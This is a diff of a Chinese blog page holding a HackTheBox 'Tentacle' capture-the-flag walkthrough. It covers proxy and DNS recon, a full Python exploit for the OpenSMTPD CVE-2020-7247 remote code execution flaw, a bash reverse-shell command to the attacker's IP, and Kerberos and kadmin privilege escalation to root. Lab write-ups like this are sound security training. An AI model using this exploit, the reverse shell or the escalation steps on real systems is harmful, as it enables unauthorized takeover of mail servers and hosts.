@@ -21,12 +21,12 @@
     
     
     <meta name="keywords" content="HackTheBox">
-    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;310  10.10.10.224   端口扫描很费时间： 12345678910111213➜  ~ nmap -sT -Pn 10.10.10.224Host discovery disabled (-Pn). All addresses will be marked &#39;up&#39; and s">
+    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;310  10.10.10.224                                                                                                              端口扫描很费时间： 1234567891">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Tentacle - HackTheBox">
 <meta property="og:url" content="https://darkwing.moe/2021/02/01/Tentacle-HackTheBox/index.html">
 <meta property="og:site_name" content="喵喵喵喵">
-<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;310  10.10.10.224   端口扫描很费时间： 12345678910111213➜  ~ nmap -sT -Pn 10.10.10.224Host discovery disabled (-Pn). All addresses will be marked &#39;up&#39; and s">
+<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;310  10.10.10.224                                                                                                              端口扫描很费时间： 1234567891">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021020101.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021020102.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021020103.jpg">
@@ -129,7 +129,7 @@
         
             <li class="waves-block waves-effect">
               <a href="https://darkwing.moe/2015/01/01/about/"  >
-                <i class="icon icon-lg icon-link2"></i>
+                <i class="icon icon-lg icon-link"></i>
                 About
               </a>
             </li>
@@ -219,14 +219,28 @@
 </li>
 <li><h2 id="10-10-10-224"><a href="#10-10-10-224" class="headerlink" title="10.10.10.224"></a>10.10.10.224</h2></li>
 </ul>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021020101.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021020101.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p>很费时间：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ nmap -sT -Pn 10.10.10.224</span><br><span class="line">Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-28 10:10 EST</span><br><span class="line">Nmap scan report for 10.10.10.224</span><br><span class="line">Host is up (0.069s latency).</span><br><span class="line">Not shown: 805 closed ports, 191 filtered ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">53/tcp   open  domain</span><br><span class="line">88/tcp   open  kerberos-sec</span><br><span class="line">3128/tcp open  squid-http</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 1031.14 seconds</span><br></pre></td></tr></table></figure>
 
 
 
 <h2 id="3128"><a href="#3128" class="headerlink" title="3128"></a>3128</h2><p>3128是squid代理，直接访问错误信息里给出域名：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021020102.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021020102.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="53"><a href="#53" class="headerlink" title="53"></a>53</h2><p>53端口是dns， 使用3128端口得到的域名对其进行子域名枚举，可以发现一些子域名及内部ip，应该是需要通过squid代理访问：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">dnsenum --threads 64 --dnsserver 10.10.10.224 -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt realcorp.htb</span><br><span class="line"></span><br><span class="line">ns.realcorp.htb.                         259200   IN    A        10.197.243.77</span><br><span class="line">proxy.realcorp.htb.                      259200   IN    CNAME    ns.realcorp.htb.</span><br><span class="line">ns.realcorp.htb.                         259200   IN    A        10.197.243.77</span><br><span class="line">wpad.realcorp.htb.                       259200   IN    A        10.197.243.31</span><br><span class="line">ns.realcorp.htb.                         259200   IN    A        10.197.243.77</span><br></pre></td></tr></table></figure>
 
@@ -239,14 +253,28 @@
 
 
 <h2 id="wpad-realcorp-htb"><a href="#wpad-realcorp-htb" class="headerlink" title="wpad.realcorp.htb"></a>wpad.realcorp.htb</h2><p>直接通过代理访问是403:</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021020103.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021020103.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="wpad-dat"><a href="#wpad-dat" class="headerlink" title="wpad.dat"></a>wpad.dat</h2><p>注意wpad是<strong>Web Proxy Auto-Discovery Protocol</strong>：</p>
 <ul>
 <li><p>WPAD 协议分析及内网渗透利用 - 先知社区<br><a href="https://xz.aliyun.com/t/1739#toc-9" target="_blank" rel="noopener">https://xz.aliyun.com/t/1739#toc-9</a></p>
 <p>可以直接查看wpad.dat文件：</p>
 </li>
 </ul>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021020104.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021020104.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">FindProxyForURL</span>(<span class="params">url, host</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (dnsDomainIs(host, <span class="string">"realcorp.htb"</span>))</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"DIRECT"</span>;</span><br><span class="line">    <span class="keyword">if</span> (isInNet(dnsResolve(host), <span class="string">"10.197.243.0"</span>, <span class="string">"255.255.255.0"</span>))</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"DIRECT"</span>;</span><br><span class="line">    <span class="keyword">if</span> (isInNet(dnsResolve(host), <span class="string">"10.241.251.0"</span>, <span class="string">"255.255.255.0"</span>))</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"DIRECT"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">"PROXY proxy.realcorp.htb:3128"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <h2 id="10-241-251-0-24"><a href="#10-241-251-0-24" class="headerlink" title="10.241.251.0/24"></a>10.241.251.0/24</h2><p>根据wpad配置文件可以发现新的子域10.241.251.0，对其进行探测，发现10.241.251.113的25端口是<strong>OpenSMTPD</strong>：</p>
@@ -260,8 +288,22 @@
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 python3 smtp_exp.py 10.241.251.113 25 'bash -c "exec bash -i &amp;&gt; /dev/tcp/10.10.14.12/4445 &lt;&amp;1"'</span><br><span class="line"></span><br><span class="line">nc -lvvp 4445</span><br></pre></td></tr></table></figure>
 
 <p>exp打到smtp的root：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021020105.jpg" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021020106.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021020105.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021020106.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="smtp-exp-py"><a href="#smtp-exp-py" class="headerlink" title="smtp_exp.py"></a>smtp_exp.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket, time</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &lt; <span class="number">4</span>:</span><br><span class="line">    print(<span class="string">"usage: getShell.py &lt;host&gt; &lt;port&gt; &lt;command&gt;"</span>)</span><br><span class="line">    exit()</span><br><span class="line">HOST = sys.argv[<span class="number">1</span>]</span><br><span class="line">PORT = int(sys.argv[<span class="number">2</span>])</span><br><span class="line">rev_shell_cmd = sys.argv[<span class="number">3</span>]</span><br><span class="line">payload = <span class="string">b"""\r\n</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#0\r\n</span></span><br><span class="line"><span class="string">#1\r\n</span></span><br><span class="line"><span class="string">#2\r\n</span></span><br><span class="line"><span class="string">#3\r\n</span></span><br><span class="line"><span class="string">#4\r\n</span></span><br><span class="line"><span class="string">#5\r\n</span></span><br><span class="line"><span class="string">#6\r\n</span></span><br><span class="line"><span class="string">#7\r\n</span></span><br><span class="line"><span class="string">#8\r\n</span></span><br><span class="line"><span class="string">#9\r\n</span></span><br><span class="line"><span class="string">#a\r\n</span></span><br><span class="line"><span class="string">#b\r\n </span></span><br><span class="line"><span class="string">#c\r\n</span></span><br><span class="line"><span class="string">#d\r\n</span></span><br><span class="line"><span class="string">"""</span> + rev_shell_cmd.encode() + <span class="string">b"""</span></span><br><span class="line"><span class="string">.</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="keyword">for</span> res <span class="keyword">in</span> socket.getaddrinfo(HOST, PORT, socket.AF_UNSPEC, socket.SOCK_STREAM):</span><br><span class="line">    af, socktype, proto, canonname, sa = res</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s = socket.socket(af, socktype, proto)</span><br><span class="line">    <span class="keyword">except</span> OSError <span class="keyword">as</span> msg:</span><br><span class="line">        s = <span class="keyword">None</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s.connect(sa)</span><br><span class="line">    <span class="keyword">except</span> OSError <span class="keyword">as</span> msg:</span><br><span class="line">        s.close()</span><br><span class="line">        s = <span class="keyword">None</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line"><span class="keyword">if</span> s <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">    print(<span class="string">'could not open socket'</span>)</span><br><span class="line">    sys.exit(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">with</span> s:</span><br><span class="line">    data = s.recv(<span class="number">1024</span>)</span><br><span class="line">    print(<span class="string">'Received'</span>, repr(data))</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    print(<span class="string">'SENDING HELO'</span>)</span><br><span class="line">    s.send(<span class="string">b"helo test.com\r\n"</span>)</span><br><span class="line">    data = s.recv(<span class="number">1024</span>)</span><br><span class="line">    print(<span class="string">'RECIEVED'</span>, repr(data))</span><br><span class="line">    s.send(<span class="string">b"MAIL FROM:&lt;;for i in 0 1 2 3 4 5 6 7 8 9 a b c d;do read r;done;sh;exit 0;&gt;\r\n"</span>)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    data = s.recv(<span class="number">1024</span>)</span><br><span class="line">    print(<span class="string">'RECIEVED'</span>, repr(data))</span><br><span class="line">    s.send(<span class="string">b"RCPT TO:&lt;j.nakazawa@realcorp.htb&gt;\r\n"</span>)</span><br><span class="line">    data = s.recv(<span class="number">1024</span>)</span><br><span class="line">    print(<span class="string">'RECIEVED'</span>, repr(data))</span><br><span class="line">    s.send(<span class="string">b"DATA\r\n"</span>)</span><br><span class="line">    data = s.recv(<span class="number">1024</span>)</span><br><span class="line">    print(<span class="string">'RECIEVED'</span>, repr(data))</span><br><span class="line">    s.send(payload)</span><br><span class="line">    data = s.recv(<span class="number">1024</span>)</span><br><span class="line">    print(<span class="string">'RECIEVED'</span>, repr(data))</span><br><span class="line">    s.send(<span class="string">b"QUIT\r\n"</span>)</span><br><span class="line">    data = s.recv(<span class="number">1024</span>)</span><br><span class="line">    print(<span class="string">'RECIEVED'</span>, repr(data))</span><br><span class="line">print(<span class="string">"Exploited Check you netcat :D"</span>)</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>
 
 <h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><h2 id="msmtprc"><a href="#msmtprc" class="headerlink" title=".msmtprc"></a>.msmtprc</h2><p>在j.nakazawa用户目录可以发现.msmtprc文件，里面有密码，但这个密码不能直接ssh：</p>
@@ -271,9 +313,23 @@
 <p>就是通过kerberos生成ticket，然后ssh直接连接，生成ticket后ssh连接不需要密码，如果提示要密码那就是操作有错：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install krb5-user</span><br><span class="line"></span><br><span class="line"># &#x2F;etc&#x2F;hosts</span><br><span class="line"># hosts只留这一个</span><br><span class="line">10.10.10.224 srv01.realcorp.htb</span><br><span class="line"></span><br><span class="line"># &#x2F;etc&#x2F;krb5.conf</span><br><span class="line"># 修改&#x2F;添加对应配置</span><br><span class="line">default_realm &#x3D; REALCORP.HTB</span><br><span class="line"></span><br><span class="line">REALCORP.HTB &#x3D; &#123;</span><br><span class="line">        kdc &#x3D; 10.10.10.224</span><br><span class="line">        &#125;</span><br><span class="line">  </span><br><span class="line"># shell</span><br><span class="line">kinit j.nakazawa # 密码就是上面得到的</span><br><span class="line">klist</span><br><span class="line">ssh j.nakazawa@10.10.10.224</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021020107.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021020107.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h1><p>然后用户目录得到user.txt:</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021020108.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021020108.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="提权信息"><a href="#提权信息" class="headerlink" title="提权信息"></a>提权信息</h1><h2 id="crontab"><a href="#crontab" class="headerlink" title="crontab"></a>crontab</h2><p>定时任务发现admin定时运行log_backup.sh：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[j.nakazawa@srv01 ~]$ cat /etc/crontab</span><br><span class="line">SHELL=/bin/bash</span><br><span class="line">PATH=/sbin:/bin:/usr/sbin:/usr/bin</span><br><span class="line">MAILTO=root</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> For details see man 4 crontabs</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Example of job definition:</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> .---------------- minute (0 - 59)</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> |  .------------- hour (0 - 23)</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> |  |  .---------- day of month (1 - 31)</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> |  |  |  |  |</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> *  *  *  *  * user-name  <span class="built_in">command</span> to be executed</span></span><br><span class="line">* * * * * admin /usr/local/bin/log_backup.sh</span><br></pre></td></tr></table></figure>
 
@@ -283,7 +339,14 @@
 <h1 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h1><p>就是写一个.k5login文件进去，使得我们可以用之前生成的ticket以admin用户身份登录：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.k5login</span><br><span class="line">j.nakazawa@REALCORP.HTB</span><br><span class="line"></span><br><span class="line">cp .k5login &#x2F;var&#x2F;log&#x2F;squid</span><br><span class="line"></span><br><span class="line"># 尝试几次，同步需要时间</span><br><span class="line">ssh admin@srv01.realcorp.htb</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021020109.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021020109.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="klist"><a href="#klist" class="headerlink" title="klist"></a>klist</h2><p>当前admin用户，klist发现很多ticket：</p>
 <blockquote>
 <p>那么什么是keytab文件？</p>
@@ -294,9 +357,25 @@
 <h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><p>所以我们可以利用kadmin去创建一个root ticket：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kadmin -k -t &#x2F;etc&#x2F;krb5.keytab -p kadmin&#x2F;admin@REALCORP.HTB</span><br><span class="line"></span><br><span class="line">add_principal root@REALCORP.HTB</span><br><span class="line"># 密码自己设置</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021020110.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021020110.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="root-flag"><a href="#root-flag" class="headerlink" title="root flag"></a>root flag</h1><p>然后ksu切到root，得到root.txt:</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021020111.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021020111.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+
+
 <h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul>
 <li>WPAD 协议分析及内网渗透利用 - 先知社区<br><a href="https://xz.aliyun.com/t/1739#toc-9" target="_blank" rel="noopener">https://xz.aliyun.com/t/1739#toc-9</a></li>
 <li><a href="https://www.qualys.com/2020/01/28/cve-2020-7247/lpe-rce-opensmtpd.txt" target="_blank" rel="noopener">https://www.qualys.com/2020/01/28/cve-2020-7247/lpe-rce-opensmtpd.txt</a></li>
